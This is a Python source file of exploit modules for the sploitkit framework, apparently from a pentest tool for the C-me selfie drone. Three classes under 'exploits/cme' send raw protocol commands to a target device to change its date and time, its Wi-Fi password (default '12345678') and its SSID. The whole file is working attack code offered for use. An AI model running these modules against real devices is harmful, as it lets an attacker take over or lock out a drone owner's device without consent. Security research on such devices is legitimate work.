# -*- coding: UTF-8 -*-
from datetime import datetime
from sploitkit import *

from generic import CmeChangeCommand


class ChangeDatetime(CmeChangeCommand):
    """
    Change the datetime of the target C-me.
    
    Author:  Yannick Pasquazzo
    Email:   y.pasquazzo@hotmail.com
    Version: 1.0
    """
    config = Config({
        Option(
            'NEW_DATETIME',
            "new datetime to be configured",
            True,
            #FIXME: validate=lambda s: [...],
        ): "01/01/1970 00:00:00",
        Option(
            'DATETIME_FORMAT',
            "datetime format to be considered",
            True,
        ): "%d/%m/%Y %H:%M:%S",
    })
    path = "exploits/cme"
    
    def run(self):
        dt = datetime.strptime(self.config.get("NEW_DATETIME"),
                               self.config.get("DATETIME_FORMAT"))
        self.logger.info("Changing datetime...")
        if s.send_command(29, {"YEAR": dt.year, "MONTH": dt.month,
                               "DAY": dt.day, "HOUR": dt.hour,
                               "MINUTE": dt.minute, "SECOND": dt.second}):
            self.logger.success("Datetime changed")


class ChangePassword(CmeChangeCommand):
    """
    Change the password of the target C-me.
    
    Author:  Yannick Pasquazzo
    Email:   y.pasquazzo@hotmail.com
    Version: 1.0
    """
    config = Config({
        Option(
            'NEW_PASSWORD',
            "new password to be configured",
            True,
        ): "12345678",
    })
    path = "exploits/cme"
    
    def run(self):
        self.logger.info("Changing password...")
        if s.send_command(69, {"phrase": self.config.get("NEW_PASSWORD"),
                               "ssid": self.config.get("SSID")}):
            self.logger.success("Password changed")


class ChangeSsid(CmeChangeCommand):
    """
    Change the SSID of the target C-me.
    
    Author:  Yannick Pasquazzo
    Email:   y.pasquazzo@hotmail.com
    Version: 1.0
    """
    config = Config({
        Option(
            'NEW_SSID',
            "new SSID to be configured",
            True,
        ): "C-me_0123456",
    })
    path = "exploits/cme"
    
    def run(self):
        self.logger.info("Changing SSID...")
        if s.send_command(68, {"phrase": self.config.get("PASSWORD"),
                               "ssid": self.config.get("NEW_SSID")}):
            self.logger.success("SSID changed")
